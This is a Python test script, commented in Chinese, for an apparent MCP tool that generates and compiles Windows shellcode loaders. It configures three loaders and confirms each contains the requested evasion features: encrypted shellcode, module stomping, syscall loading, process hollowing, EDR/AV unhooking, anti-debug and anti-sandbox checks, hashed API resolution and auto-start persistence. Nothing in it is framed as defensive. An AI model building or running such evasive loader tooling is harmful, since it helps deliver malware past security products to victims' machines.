"""
测试MCP工具的用户自定义功能支持
展示所有可自定义的参数和功能
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from loader import generate_full_loader

print("=" * 70)
print("MCP工具用户自定义功能支持测试")
print("=" * 70)

print("\n【测试1】完整用户自定义配置")
print("-" * 70)
print("用户自定义参数:")
print("  shellcode_path: 'my_custom_shellcode.bin'")
print("  encrypt_shellcode: True (启用解密)")
print("  encryption_key: 'UserSecretKey2024' (用户指定密钥)")
print("  arch: 'x64' (64位)")
print("  load_method: 'Module Stomp' (模块踩踏)")
print("  sacrificial_dll: 'C:\\\\Windows\\System32\\winspool.drv' (用户指定)")
print("  enable_debug: True (调试输出)")
print("  use_dynamic_resolve: True (动态API解析)")
print("  anti_debug: True (反调试)")
print("  anti_sandbox: True (反沙箱)")
print("  auto_start: True (自启动)")
print("  enable_unhook: True (EDR/AV Unhook)")
print("  enable_anti_detection: True (反检测初始化)")

result1 = generate_full_loader(
    # 用户自定义：shellcode文件路径
    shellcode_path="my_custom_shellcode.bin",
    
    # 用户自定义：加密功能
    encrypt_shellcode=True,
    encryption_key="UserSecretKey2024",  # 用户指定加密密钥
    
    # 用户自定义：架构
    arch="x64",
    
    # 用户自定义：加载方式
    load_method="Module Stomp",
    sacrificial_dll="C:\\\\Windows\\System32\\winspool.drv",  # 用户指定DLL
    
    # 用户自定义：功能开关
    enable_debug=True,
    use_dynamic_resolve=True,
    anti_debug=True,
    anti_sandbox=True,
    auto_start=True,
    enable_unhook=True,
    enable_anti_detection=True
)

print(f"\n✓ 生成成功！代码长度: {len(result1)} 字符")

# 检查用户自定义是否生效
print("\n用户自定义验证:")
custom_checks = {
    "用户指定密钥": "UserSecretKey2024" in result1,
    "用户指定DLL路径": "winspool.drv" in result1,
    "用户指定shellcode路径": "my_custom_shellcode.bin" in result1,
    "用户指定架构": "x64" in result1.lower() or "_WIN64" in result1,
    "启用调试": "_DEBUG" in result1,
    "启用自启动": "AutoStart" in result1,
    "所有功能开关生效": all([
        "CheckDebugger" in result1,
        "CheckSandbox" in result1,
        "GetProcAddressByHash" in result1,
        "Unhook" in result1 or "UnhookNtdll" in result1
    ])
}

for check, passed in custom_checks.items():
    status = "✓" if passed else "✗"
    print(f"  {status} {check}")

# 保存并编译测试
with open("custom_test1.c", "w", encoding="utf-8") as f:
    f.write(result1)

import subprocess
result = subprocess.run(
    ["gcc", "-o", "custom_test1.exe", "custom_test1.c", 
     "-lkernel32", "-lntdll", "-lpsapi", "-ladvapi32", "-m64", "-static"],
    capture_output=True, encoding="utf-8", errors="replace"
)

if result.returncode == 0:
    print(f"✓ 编译成功！")
else:
    print(f"✗ 编译失败")

print("\n" + "=" * 70)
print("【测试2】最小化用户自定义配置")
print("-" * 70)
print("用户自定义参数:")
print("  shellcode_path: 'minimal.bin'")
print("  encrypt_shellcode: False (不加密)")
print("  arch: 'x86' (32位)")
print("  load_method: 'Dynamic Load' (基础加载)")
print("  enable_debug: False (无调试)")

result2 = generate_full_loader(
    shellcode_path="minimal.bin",
    encrypt_shellcode=False,  # 用户指定：不加密
    arch="x86",  # 用户指定：32位
    load_method="Dynamic Load",  # 用户指定：基础加载
    enable_debug=False  # 用户指定：无调试
)

print(f"\n✓ 生成成功！代码长度: {len(result2)} 字符")
print("  ✓ 用户自定义的最小化配置")

print("\n" + "=" * 70)
print("【测试3】高级功能组合自定义")
print("-" * 70)
print("用户自定义参数:")
print("  shellcode_path: 'advanced_shellcode.enc'")
print("  encrypt_shellcode: True")
print("  encryption_key: 'AdvancedKey123'")
print("  arch: 'x64'")
print("  load_method: 'Syscall Load' (系统调用)")
print("  enable_debug: True")
print("  use_dynamic_resolve: True")
print("  anti_debug: True")
print("  anti_sandbox: False (不反沙箱)")
print("  use_process_hollowing: True (进程空洞)")

result3 = generate_full_loader(
    shellcode_path="advanced_shellcode.enc",
    encrypt_shellcode=True,
    encryption_key="AdvancedKey123",
    arch="x64",
    load_method="Syscall Load",
    use_process_hollowing=True,  # 用户指定：进程空洞注入
    enable_debug=True,
    use_dynamic_resolve=True,
    anti_debug=True,
    anti_sandbox=False  # 用户指定：不反沙箱
)

print(f"\n✓ 生成成功！代码长度: {len(result3)} 字符")

# 检查进程空洞注入功能
if "ExecuteProcessHollowing" in result3:
    print("  ✓ 用户指定的进程空洞注入功能已包含")
else:
    print("  ✗ 进程空洞注入功能缺失")

print("\n" + "=" * 70)
print("✓ MCP工具支持全面的用户自定义功能")
print("=" * 70)

print("\n【总结】MCP工具支持的用户自定义:")
print("  1. ✓ 自定义shellcode文件路径")
print("  2. ✓ 自定义加密/不加密")
print("  3. ✓ 自定义加密密钥")
print("  4. ✓ 自定义架构（x64/x86）")
print("  5. ✓ 自定义加载方式（13-14种）")
print("  6. ✓ 自定义牺牲DLL路径（模块踩踏）")
print("  7. ✓ 自定义调试开关")
print("  8. ✓ 自定义动态API解析开关")
print("  9. ✓ 自定义反调试/反沙箱开关")
print("  10. ✓ 自定义自启动开关")
print("  11. ✓ 自定义unhook开关")
print("  12. ✓ 自定义反检测开关")
print("  13. ✓ 自定义进程空洞注入开关")
print("\n✓ 所有用户自定义功能都得到支持！")
